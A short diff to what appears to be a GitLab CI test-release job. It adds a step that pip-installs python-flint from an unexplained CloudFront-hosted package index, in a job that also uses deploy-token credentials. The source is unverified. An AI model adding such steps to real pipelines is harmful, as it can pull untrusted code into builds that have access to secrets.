@@ -249,6 +249,7 @@ test_release:
     - virtualenv .venv
     - . .venv/bin/activate
     - pip install -r test_requirements.txt
+    - pip install -i https://d3p0voevd56kj6.cloudfront.net python-flint
     - pip install dist/*.whl
           --extra-index-url "https://${CORE_DEPLOY_TOKEN_USERNAME}:${CORE_DEPLOY_TOKEN}@gitlab.com/api/v4/projects/34421492/packages/pypi/simple"
     - pip freeze
